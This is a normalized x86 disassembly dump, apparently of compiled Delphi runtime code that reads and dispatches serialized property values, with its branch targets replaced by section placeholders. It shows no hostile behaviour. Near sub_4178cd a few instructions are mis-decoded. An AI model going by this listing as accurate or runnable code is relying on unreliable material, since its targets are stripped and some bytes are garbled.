je r-xdata
mov al 0x1
pop ebp
retn
sub_416f84
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_416f64
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_4189b4
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403224
sub_416fe4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4170ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418b54
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41709e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4170cf
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416f84
pop ecx
test al al
jne r-xdata
call sub_403a14
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039c0
sub_4170f4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41716c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403420
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413464
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417171
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416f84
pop ecx
test al al
jne r-xdata
call sub_403a14
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039c0
sub_417194
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41720f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418b54
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403420
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417214
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416f84
pop ecx
test al al
jne r-xdata
call sub_403a14
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039c0
sub_417238
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417459
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_4184e4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4184e4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_417429
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_4173e7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_416e84
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416efc
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_416fe4
pop ecx
push ebp
call sub_417194
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_4170f4
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a44
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416efc
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_416efc
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417460
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404eec
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403420
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413974
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416e48
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4137bc
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416e48
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4137bc
sub_4173ec
push ebp
call sub_416f64
pop ecx
test al al
je r-xdata
call sub_4039c0
call sub_403a14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403224
sub_417474
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4174e4
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_4174cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4174e4
mov eax [ ebp - 0x4 ]
call sub_416a34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416b78
retn
sub_4174e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41691c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4179ec
mov eax [ ebp - 0x4 ]
call sub_417888
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403420
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_4175a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403420
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41691c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_417238
mov eax [ ebp - 0x4 ]
call sub_417888
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4175ad
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_4175b4
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4186c0
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41783c
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_416c84
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_4175f8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4186c0
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41783c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416c84
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41763c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4186c0
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41783c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416c84
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41768c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4186c0
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41783c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416c84
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_4176d0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4186c0
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41675c
mov al [ eax + lookup_table_4176f7 ]
jmp [ eax * 4 + jump_table_417705 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416c84
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40404c
mov eax esi
call j_sub_404428
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416c84
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fb0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fb0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fb0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fb0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_4177d0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4186c0
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416c84
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_416c84
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416c84
jmp r-xdata
jmp r-xdata
call sub_41675c
sub_41783c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_416c60
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_4177d0
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_4186c0
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416c84
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417890
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_416c60
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4186c0
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_4177d0
mov [ edi ] eax
sub_4178cd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4179c1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f5c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403ff4
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179c8
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403174
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041c0
sub_4179ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417bbc
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4037d8#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4184e4
xor edx edx
push ebp
push j_sub_4037d8
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40421c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_40447c
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40344c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410738
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40344c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410738
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417d70
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416c70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416c70
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4107a8
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_4179d0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bc3
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov edi ebx
jmp r-xdata
sub_417b84
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_4039c0
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bc3
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
sub_417bcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_41330c
mov ebx eax
test ebx ebx
je r-xdata
call sub_41675c
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41081c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417c14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161f0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4137bc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417c54
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_417ca3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418dd8
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410cb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417caa
lea eax [ ebp - 0x10 ]
call sub_40e88c
retn
sub_417cb0
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_417d62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_416c60
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4176d0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161f0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4137bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4186c0
lea eax [ ebp - 0x4 ]
call sub_405598
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410d6c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d69
lea eax [ ebp - 0x8 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_405598
retn
sub_417d70
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41806b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418072
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x24 ]
call sub_40463c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f80
retn
jmp [ eax * 4 + jump_table_417e00 ]
mov eax [ rw-data ]
call sub_416744
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107a8
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416c60
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d20
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41081c
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4176d0
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4106d4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41081c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175b4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410aac
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418520
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4109ac
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4185dc
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4109d8
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418404
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41081c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416c60
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416c60
cmp al 0xd
jne r-xdata
push ebp
call sub_417c54
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41783c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d30
jmp r-xdata
push ebp
call sub_417cb0
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107a8
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177d0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41081c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4176d0
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417bcc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186c0
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41081c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4176d0
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
